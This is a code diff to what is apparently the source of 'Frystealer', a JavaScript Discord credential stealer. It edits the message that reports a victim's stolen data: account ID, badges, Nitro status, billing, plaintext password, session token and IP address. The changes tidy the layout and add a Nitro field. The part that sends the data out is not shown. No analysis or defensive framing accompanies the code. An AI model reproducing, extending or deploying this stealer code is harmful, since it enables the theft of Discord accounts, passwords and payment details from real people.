@@ -617,12 +617,17 @@ const login = async (email, password, token) => {
           {
             name: 'ID',
             value: `${json.id}`,
-            inline: false,
+            inline: true,
           },
           { 
-            name: 'Badges',
+            name: '<a:badges:990780871516770374> Badges',
             value: `${badges}`,
             inline: false,
+          },
+          {
+            name: 'Nitro',
+            value: `${nitro}`,
+            inline: true,
           },
           {
             name: 'Billing',
@@ -642,7 +647,7 @@ const login = async (email, password, token) => {
           {
             name: 'Password',
             value: `\`${password}\``,
-            inline: false,
+            inline: true,
           },
           {
             name: 'Token',
@@ -652,18 +657,18 @@ const login = async (email, password, token) => {
           {
             name: 'IP',
             value: `\`${config.ip}\``,
-            inline: true,
+            inline: false,
           }
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' - ' + json.id,
+          name: 'User Login',
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
           text: 'Frystealer',
         },
         thumbnail: {
-          url: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
       },
     ],
